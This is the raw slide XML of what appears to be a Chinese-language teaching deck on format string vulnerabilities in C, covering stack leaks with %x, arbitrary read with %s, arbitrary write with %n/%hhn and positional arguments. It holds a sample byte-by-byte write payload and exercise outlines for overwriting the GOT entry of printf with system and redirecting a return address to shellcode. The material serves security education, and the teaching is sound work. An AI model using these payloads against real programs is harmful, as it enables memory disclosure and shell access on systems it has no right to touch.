                <a:srgbClr val="42719B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8" name="ebp"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-1" y="160143"/>
              <a:ext cx="118724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ebp</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="342" name="右箭头 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3564501" y="4159710"/>
            <a:ext cx="1356852" cy="678427"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1356851" cy="678425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="340" name="箭头"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="1356852" cy="678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>
              <a:solidFill>
                <a:srgbClr val="42719B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1" name="esp"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-1" y="160143"/>
              <a:ext cx="118724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esp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标题 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344128" y="276635"/>
            <a:ext cx="3186267" cy="632081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66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>printf(str,1,2)</a:t>
            </a:r>
            <a:br/>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>函数调用</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="345" name="内容占位符 3"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4955457" y="1150373"/>
          <a:ext cx="4120333" cy="478831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120331"/>
              </a:tblGrid>
              <a:tr h="67319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ebp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ret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formatstring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  <a:r>
                        <a:t>管他是什么无所谓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ebp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ret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arg1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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="348" name="右箭头 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3598605" y="1150373"/>
            <a:ext cx="1356853" cy="678427"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1356851" cy="678425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="346" name="箭头"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="1356852" cy="678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>
              <a:solidFill>
                <a:srgbClr val="42719B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7" name="ebp"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-1" y="160143"/>
              <a:ext cx="118724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ebp</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="351" name="右箭头 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3598605" y="79323"/>
            <a:ext cx="1356853" cy="678427"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1356851" cy="678425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="349" name="箭头"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="1356852" cy="67842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12700" cap="flat">
              <a:solidFill>
                <a:srgbClr val="42719B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0" name="esp"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-1" y="160143"/>
              <a:ext cx="1187248" cy="358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esp</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="352" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="471948" y="4306530"/>
            <a:ext cx="3805084" cy="161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FFFF00"/>
                </a:solidFill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等线"/>
              </a:rPr>
              <a:t>本来是只能有两个格式化字符串的，但是如果输入的是这样的</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5023668" y="2241755"/>
            <a:ext cx="4120332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0000"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%d,%d,%x,%x,%x,%x</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="354" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="78656" y="5691525"/>
            <a:ext cx="5289757" cy="122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rPr>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:sym typeface="等线"/>
              </a:rPr>
              <a:t>输出就变成了这样：</a:t>
            </a:r>
            <a:r>
              <a:t>1,2,abcedf,0804f2e3,08048422,ffffffff</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="355" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4208821" y="2997485"/>
            <a:ext cx="309409" cy="326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00B0F0"/>
                </a:solidFill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等线"/>
              </a:rPr>
              <a:t>泄漏了！！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52" grpId="1"/>
      <p:bldP build="whole" bldLvl="1" animBg="1" rev="0" advAuto="0" spid="355" grpId="4"/>
      <p:bldP build="whole" bldLvl="1" animBg="1" rev="0" advAuto="0" spid="354" grpId="3"/>
      <p:bldP build="whole" bldLvl="1" animBg="1" rev="0" advAuto="0" spid="353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B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>怎么用</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="358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超出的每一个格式化字符串都能对下一格的栈空间造成影响</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%d</a:t>
            </a:r>
            <a:r>
              <a:t>：打印成数字</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%x</a:t>
            </a:r>
            <a:r>
              <a:t>：打印成</a:t>
            </a:r>
            <a:r>
              <a:t>16</a:t>
            </a:r>
            <a:r>
              <a:t>进制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8064">
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="361" name="内容占位符 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="body" sz="half" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1825625"/>
            <a:ext cx="2979790" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>配合</a:t>
            </a:r>
            <a:r>
              <a:t>%s</a:t>
            </a:r>
            <a:r>
              <a:t>可以实现任意地址读</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:t>%s</a:t>
            </a:r>
            <a:r>
              <a:t>）不是直接打印栈中内容，而是通过栈中指针寻址，再打印</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="362" name="内容占位符 3"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4404852" y="1150373"/>
          <a:ext cx="4670938" cy="478831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4670937"/>
              </a:tblGrid>
              <a:tr h="67319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ebp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ret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>
                          <a:solidFill>
                            <a:srgbClr val="7030A0"/>
                          </a:solidFill>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>Formatstring</a:t>
                      </a:r>
                      <a:r>
                        <a:t>：</a:t>
                      </a:r>
                      <a:r>
                        <a:t>%d,%d,%s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>
                          <a:solidFill>
                            <a:srgbClr val="7030A0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b="1" sz="3200"/>
                      </a:pPr>
                      <a:r>
                        <a:t>这是一个可控的变量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87874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ebp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ret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29393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3200"/>
                        <a:t>arg1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363" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5329084" y="4001294"/>
            <a:ext cx="4218040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600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:sym typeface="等线"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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等线"/>
              </a:rPr>
              <a:t>改成任意地址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3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768095">
              <a:defRPr sz="8064">
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%n</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="366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%n</a:t>
            </a:r>
            <a:r>
              <a:t>是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr b="1" sz="3600">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>利用</a:t>
            </a:r>
            <a:r>
              <a:t>%n</a:t>
            </a:r>
            <a:r>
              <a:t>向内存中写入值</a:t>
            </a:r>
            <a:r>
              <a:t>!!(</a:t>
            </a:r>
            <a:r>
              <a:t>任意地址写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sz="6600">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>%n</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>的正常使用</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="369" name="内容占位符 3" descr="内容占位符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307" y="1463853"/>
            <a:ext cx="5772152" cy="4031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0263" y="4898402"/>
            <a:ext cx="6076812" cy="1797366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sx="100000" sy="100000" kx="0" ky="0" algn="b" rotWithShape="0" blurRad="63500" dist="50800" dir="2700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 sz="4000">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr b="0"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>问题：如何简单控制打印的数量</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="373" name="内容占位符 3" descr="内容占位符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1387" y="1540059"/>
            <a:ext cx="5272330" cy="34795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1387" y="5143089"/>
            <a:ext cx="8262937" cy="9725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B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:t>的使用</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="377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定位参数（一个一个跳太麻烦）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%11$n = %x%x%x%x%x%x%x%x%x%x%n</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>有的时候必须用</a:t>
            </a:r>
            <a:r>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:t>，因为</a:t>
            </a:r>
            <a:r>
              <a:t>%x</a:t>
            </a:r>
            <a:r>
              <a:t>什么的打印的太多了会导致写一些小数的时候，没法写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標題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Format string</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="380" name="內容版面配置區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%x : Unsigned hexadecimal integer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%s : String of characters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%p : Pointer address</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%n : The number of characters written so far is stored in the pointed location</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%(num)c :  Print num characters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>%(num)$x :</a:t>
            </a:r>
            <a:r>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:t>dump num</a:t>
            </a:r>
            <a:r>
              <a:rPr baseline="30000"/>
              <a:t>th</a:t>
            </a:r>
            <a:r>
              <a:t> parameter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>Ex</a:t>
            </a:r>
            <a:r>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:t>%100$x : dump 100</a:t>
            </a:r>
            <a:r>
              <a:rPr baseline="30000"/>
              <a:t>th</a:t>
            </a:r>
            <a:r>
              <a:t> dword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標題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Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="383" name="內容版面配置區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%n</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%n : dword : 4 bytes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%hn : word : 2 bytes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%hhn: byte : 1 bytes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>Try to write value 0x6a686664 to 0x08045566</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>0x64 to 0x08045566 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>0x66 to 0x08045567</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>0x68 to 0x08045568</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>0x6a to 0x08045569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標題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Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="386" name="內容版面配置區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Try to write value 0x6a686664 to 0x08045566</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>Payload will look like this</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>\x66\x55\x04\x08\x67\x55\x04\x08	// 8 characters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>\x68\x55\x04\x08\x69\x55\x04\x08	// 8 characters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%84c%4$hhn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%2c%5$hhn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%2c%6$hhn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t>%2c%7$hhn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F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr b="0"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>例题</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="389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2500">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="72000"/>
              </a:lnSpc>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pP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例题fmt overwrite got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输入在stack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先确定输入在stack中的位置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泄漏两个地址，查询libc库确定libc版本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got劫持 printf—-&gt;system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输入/bin/sh\0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printf(“/bin/sh\0") 其实是 system(“/bin/sh\0”)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8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8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B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr b="0"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>例题</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="392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sz="2500">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="72000"/>
              </a:lnSpc>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pP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例题 ebp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输入不在stack中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利用栈帧结构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第一次泄漏返回地址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写进shellcode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="142875" indent="-142875">
              <a:lnSpc>
                <a:spcPct val="72000"/>
              </a:lnSpc>
              <a:defRPr b="1" sz="2500">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>修改返回地址到shellcode去执行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3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3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9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标题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大多数条件下</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="395" name="内容占位符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直接利用</a:t>
            </a:r>
            <a:r>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:t>进行栈写操作的条件不成熟</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>都是利用</a:t>
            </a:r>
            <a:r>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:t>进行信息泄漏</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>配合泄漏出来的</a:t>
            </a:r>
            <a:r>
              <a:t>libc</a:t>
            </a:r>
            <a:r>
              <a:t>基址结合一个栈溢出进行利用</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>或者用来泄漏一些关键值，比如canary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Class="entr" nodeType="with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395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2_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2_Office Theme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2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2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2_Office Theme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2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